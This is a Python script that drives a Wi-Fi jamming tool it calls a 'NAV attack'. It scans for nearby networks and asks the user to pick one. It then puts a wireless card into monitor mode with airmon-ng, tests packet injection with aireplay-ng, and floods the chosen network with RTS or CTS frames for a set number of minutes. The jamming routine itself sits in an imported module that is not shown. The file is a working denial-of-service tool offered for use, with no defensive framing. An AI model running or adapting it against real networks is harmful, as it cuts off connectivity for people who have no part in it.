import sys, os, subprocess
sys.path.append(".")
from src.jammer import Jammer

if __name__ == "__main__":

    jammer = Jammer()

    subprocess.Popen('figlet "NAV attack"', shell=True)

    FNULL = open(os.devnull, 'w')

    bssid = jammer.network_scan()

    red = input("Tell me the network number you want to jam: ")

    print("+-" * 40)

    #Call airmon-ng to show the user a list of available network cards on their device
    subprocess.call('airmon-ng', shell=True)

    print("+-" * 40)

    #Select a network card
    networkCard = input('Please enter the name of the network card you wish to use: ')

	#Kill all processes that can interrupt
    subprocess.call('airmon-ng check kill', stdout=FNULL, stderr=subprocess.STDOUT, shell=True)

    #Start monitor mode on the selected device and run 'airmon-ng check kill' to kill of any process that may be interfering with the network card
    subprocess.call('airmon-ng start {}'.format(networkCard), stdout=FNULL, stderr=subprocess.STDOUT, shell=True)

    print("+-" * 40)

    #Call airmon-ng to show the user a list of available network cards on their device
    subprocess.call('airmon-ng', shell=True)

    print("+-" * 40)

    #Select a monitor mode network card
    card = input('Please enter the name of the monitor mode network card you wish to use: ')

    print("+-" * 40)

    #Time you want to jam
    time = input('Tell me how much time do you want to jam in minutes Remember that you will be able to stop the Jammer when you want doing ctrl + c: ')

    print("+-" * 40)

    time = jammer.calcule_time(time)

    card_mac = jammer.get_mac(card)

    #injection test before inject RTS/CTS paquets in the network
    print("Testing your card, wait a moment. You can stop it doing ctrl + c.")
    try:
        i = 0
        while i < 2:
            subprocess.call('aireplay-ng --test {}'.format(card), stdout=FNULL, stderr=subprocess.STDOUT, shell=True)
            i = i + 1
    except KeyboardInterrupt:
        pass
    sub = ''

    while sub != 'rts' and sub != 'cts':
        sub = input('What type of flooding attack do you want to do: rts or cts: ')
        if sub != 'rts' and sub != 'cts':
            print("Sorry, that's not an option. Choose between rts or cts.")

    bssid_selected = bssid[int(red)]

    jammer.jam_nav(bssid[int(red)], card, card_mac , sub, time)
